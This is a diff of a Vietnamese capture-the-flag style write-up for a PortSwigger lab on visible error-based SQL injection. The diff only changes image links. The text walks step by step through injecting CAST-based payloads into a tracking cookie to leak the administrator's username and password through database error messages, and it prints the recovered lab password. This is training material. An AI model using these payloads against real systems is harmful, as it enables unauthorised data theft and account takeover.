@@ -226,69 +226,69 @@ Loại truy vấn này cũng có thể hữu ích nếu ứng dụng **giới h�
 
 # Lab: Visible error-based SQL injection
 
-![img](161)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image161.png?raw=true)
 
 Truy cập lab:
 
-![img](162)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image162.png?raw=true)
 
 Chọn category Pets và intercept request trong Burp Suite: 
 
-![img](163)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image163.png?raw=true)
 
 => Website sử dụng Tracking cookie để theo dõi hành vi của người dùng. Thử thêm dấu **'** vào giá trị TrackingId: 
 
-![img](164)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image164.png?raw=true)
 
 Send request và quan sát response: 
 
-![img](165)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image165.png?raw=true)
 
 => Website trả về thông báo lỗi *Unterminated string literal started at position 53 in SQL SELECT * FROM tracking WHERE id = 'aLFRLQuf2ZMDGk4B' '. Expected  char*. 
 
 Thử thêm **'--**:
 
-![img](166)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image166.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](167)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image167.png?raw=true)
 
 => Website không trả về lỗi. Thử chèn **' AND CAST((SELECT 1) AS int)--**: 
 
-![img](168)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image168.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](169)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image169.png?raw=true)
 
 => Website trả về lỗi *ERROR: argument of AND must be type boolean, not type integer Position: 63*
 
 => Điều kiện **AND** phải là biểu thức boolean. Thử chèn **' AND 1=CAST((SELECT 1) AS int)--**: 
 
-![img](170)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image170.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](171)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image171.png?raw=true)
 
 => Website không trả về lỗi => đây là 1 truy vấn hợp lệ. Chỉnh sửa truy vấn thành **' AND 1=CAST((SELECT username FROM users) AS int)--**:
 
-![img](172)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image172.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](173)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image173.png?raw=true)
 
 => Website trả về lỗi *Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'aLFRLQuf2ZMDGk4B' AND 1=CAST((SELECT username FROM users) AS'. Expected  char*
 
 Nhận thấy truy vấn chèn đang bị rút gọn, có thể do giới hạn ký tự => không có phần chỉ định comment (--). Xóa giá trị TrackingId và gửi lại request: 
 
-![img](174)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image174.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](175)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image175.png?raw=true)
 
 => Website trả về lỗi *ERROR: more than one row returned by a subquery used as an expression*. 
 
@@ -296,11 +296,11 @@ Send request, quan sát response:
 
 Chỉnh sửa lại truy vấn để nó chỉ trả về 1 hàng: **' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--**:
 
-![img](176)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image176.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](177)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image177.png?raw=true)
 
 => Website trả về thông báo lỗi *ERROR: invalid input syntax for type integer: "administrator"*
 
@@ -308,17 +308,17 @@ Send request, quan sát response:
 
 Chỉnh sửa payload thành **' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--**: 
 
-![img](178)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image178.png?raw=true)
 
 Send request, quan sát response: 
 
-![img](179)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image179.png?raw=true)
 
 => Tìm ra password của người dùng đầu tiên: l6pt2ypstrizz9jrjtmr
 
 Login tài khoản administrator và solved bài lab: 
 
-![img](180)
+![img](https://github.com/DucThinh47/PortSwigger/blob/main/SQL-injection/images/image180.png?raw=true)
 
 
 
